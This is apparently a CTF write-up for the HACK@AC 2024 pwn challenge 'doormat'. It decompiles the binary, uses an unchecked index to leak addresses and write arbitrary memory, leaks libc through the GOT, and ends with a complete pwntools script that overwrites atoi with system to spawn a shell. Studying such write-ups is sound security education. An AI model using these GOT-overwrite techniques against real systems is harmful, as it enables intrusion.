---
title: doormat
date: 2024-02-26
tags: 
- pwn
- author-hartmannsyg
categories: HACK@AC 2024
---

written by {% person hartmannsyg %}

We are given a binary `./doormat` and a `libc-2.27.so`.

{% ccb terminal:true html:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/hack@ac/doormat</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> checksec doormat
[</SPAN><SPAN STYLE="color:#61AFEF;">*</SPAN><SPAN STYLE="color:#DCDFE4;">] '/home/suwandi/ctf/hack@ac/doormat/doormat'
    Arch:       amd64-64-little
    RELRO:      </SPAN><SPAN STYLE="color:#E06C75;">No RELRO
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stack:      </SPAN><SPAN STYLE="color:#98C379;">Canary found
</SPAN><SPAN STYLE="color:#DCDFE4;">    NX:         </SPAN><SPAN STYLE="color:#98C379;">NX enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    PIE:        </SPAN><SPAN STYLE="color:#98C379;">PIE enabled</SPAN>
{% endccb %}

Let's try running the binary

{% ccb terminal:true html:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/hack@ac/doormat</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> ./doormat
-----------
1. View house
2. Leave letter
3. Leave
&gt;</SPAN>
{% endccb %}

We have three options, view house, leave letter and leave. Let's see what each option does

## View house

{% ccb terminal:true %}
> 1
Index: 0
  _m_
/\___\
|_|""|
Letter:
(stop reading other ppl's letters...)
-----------
1. View house
2. Leave letter
3. Leave
>
{% endccb %}

We are prompted for an index, and then we can read their "letter":

{% ccb gutter1:1-22 highlight:14 lang:c caption:ghidra %}
void view_house(void)

{
  long canary;
  int index;
  long in_FS_OFFSET;
  int idx;
  char buf [32];
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index: ");
  fgets(buf,0x20,_stdin);
  index = atoi(buf);
  printf("%s",houses[index]->art);
  printf("Letter: %s\n",letters[index]);
  puts("(stop reading other ppl\'s letters...)");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

I realized that we can leak certain values using the "read letter" feature. We see that the `house` struct, gets allocated to the heap, so each `house` is actually a pointer to the heap.



{% ccb lang:c caption:ghidra gutter1:1-21 highlight:11 %}
void setup(void)

{
  house *phVar1;
  int i;
  
  setbuf(_stdin,(char *)0x0);
  setbuf(_stdout,(char *)0x0);
  setbuf(_stderr,(char *)0x0);
  for (i = 0; i < 3; i = i + 1) {
    phVar1 = (house *)malloc(0x20);
    houses[i] = phVar1;
  }
  houses[0]->doormat = "hello!";
  houses[0]->art = "  _m_   \n/\\___\\\n|_|\"\"|\n";
  houses[1]->doormat = "konnichiwa!";
  houses[1]->art = " _____\n| \" \" |--\n| \" \" |\" \\\n[  -  ]  |\n";
  houses[2]->doormat = "annyeong!";
  houses[2]->art = "     ~~\n   ~\n _u__\n/____\\\n|[][]|\n|[]..|\n\'--\'\'\'\n";
  return;
}
{% endccb %}

<img src='/static/HackAC2024/doormat0.png' width=200>

![](/static/HackAC2024/doormat1.png)

We see that `house->art` (which is a `char*` which just means its a pointer to a string) has an offset of 0x8. To put it simply:

![](/static/HackAC2024/doormat2.png)

each "long bar" in this diagram is 8 bytes wide.

## Leave Letter

{% ccb lang:c gutter1:1-21 caption:ghidra highlight:15 diff_add:14 %}
void leave_letter(void)

{
  int index;
  long in_FS_OFFSET;
  int idx;
  char buf [32];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index: ");
  fgets(buf,0x20,_stdin);
  index = atoi(buf);
  fgets((char *)letters[index],8,_stdin);
  printf("\nLetter sent to %p.\n",letters[index]);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

{% ccb terminal:true highlight:9 diff_add:7,19 %}
-----------
1. View house
2. Leave letter
3. Leave
> 2
Index: 0
rwandi

Letter sent to 0x55956b4012f0.
-----------
1. View house
2. Leave letter
3. Leave
> 1
Index: 0
  _m_
/\___\
|_|""|
Letter: rwandi

(stop reading other ppl's letters...)
-----------
{% endccb %}

![](/static/HackAC2024/doormat3.png)

We have a leak for the address of `letters` which is nice because this means we know the addresses of `houses`, which is right beside `letters` in the `.bss` segment of ghidra:

![](/static/HackAC2024/doormat4.png)

We also know that the `.got` sits "right above" the `.bss`, so the offset of `.got` from `.bss` is always the same.

![](/static/HackAC2024/doormat5.png)

We also have an **arbitrary write** which is huge! We can now write any data to any address we want. Since we know the address of `.got`, and that there is no RELRO, we can overwrite GOT functions with impunity. Since we can control where the instructions for all the library functions are, we can redirect it to somewhere malicious.

## Leaking libc

We still need to leak the libc address so we can find dangerous gadgets to use. In order to leak the libc address, we have to somehow read the address referenced at the GOT. We use the "view house" feature to do this. The "View House" feature, if you recall, goes to the pointed address, adds 8 (for the `art`), and follows *that* referenced address and prints the string:

![](/static/HackAC2024/doormat2.png)

Now, we abuse this by redirecting it to the GOT. The tricks here are that:
1. `letters[4]` = `houses[0]`, `letters[5]` = `houses[1]`, etc...
2. we write to `houses[0]` (which is `letters[4]`) the *address* of `houses[1]`
3. we write to `houses[2]` (which is `letters[6]`) the *address* of our GOT function

![](/static/HackAC2024/doormat6.png)

With this, when we view house 0, we leak the libc address of `atoi`, and from there we can find the libc base.

## I'm stuck

I figured out this much during the ctf, but it still couldn't get shell. I tried overwriting GOT with a one gadget (which would theoretically run execve to get shell) but none of them worked. 

As it turned out the solution was right within my grasp. I just needed to overwrite `atoi` with `system`, and provide the `"/bin/sh"` string via user input. Since in the ghidra decompilation of the `menu()` function, the user input `buf` gets used as the first parameter,

{% ccb gutter1:1-35 caption:ghidra lang:c highlight:16-17%}
void menu(void)

{
  int option;
  long in_FS_OFFSET;
  int choice;
  char buf [32];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("-----------");
  puts("1. View house");
  puts("2. Leave letter");
  puts("3. Leave");
  printf("> ");
  fgets(buf,0x20,_stdin);
  option = atoi(buf);
  if (option == 2) {
    leave_letter();
  }
  else if (option == 3) {
    leave();
  }
  else if (option == 1) {
    view_house();
  }
  else {
    puts("Invalid choice");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

if we overwrite `atoi` to `system`, instead of `atoi('/bin/sh')`, we get `system('/bin/sh')` and we get shell.

{% ccb lang:py caption:solve.py gutter1:1-54 %}
from pwn import *

context.binary = elf = ELF('./doormat')
version = 'libc-2.27.so'
context.log_level = 'debug'
library_path = libcdb.download_libraries(version)
if library_path:
    elf = context.binary = ELF.patch_custom_libraries(elf.path, library_path)
    libc = elf.libc
else:
    libc = ELF(version)

# p = process([elf.path])
gdbscript = 'break *(menu+122)'
p = gdb.debug([elf.path], gdbscript=gdbscript)
# p = remote('beta.hackac.live',8001)

def viewHouse(index):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Index:', str(index).encode())

def leaveLetter(index, content):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendline(content)
    p.recvline()

def leave():
    p.sendlineafter(b'>', b'3')
    
leaveLetter(0, b'a'*4)
leak = p.recvline()

letters_addr = int(leak[17:29], 16)
log.info("letters address: " + hex(letters_addr))
atoi_got_addr = letters_addr - 48
log.info("atoi got address: " + hex(atoi_got_addr))
leaveLetter(4, p64(letters_addr + 5*0x8))
log.info('set houses[0] to point to houses[1]')

leaveLetter(6, p64(atoi_got_addr))
log.info('set houses[2] to point to atoi GOT to leak libc atoi')
viewHouse(0)
libc_atoi = p.recvline()[1:7]
libc_atoi_addr = u64(libc_atoi+b'\x00\x00')
libc_base = libc_atoi_addr - libc.sym['atoi']
libc_system = libc_base + libc.sym['system']
log.info("libc base: " + hex(libc_base))

index = int((atoi_got_addr - letters_addr)/8)
leaveLetter(index, p64(libc_system)) # overwrite atoi() with system()
p.sendlineafter(b'>', b'/bin/sh')

p.interactive()
{% endccb %}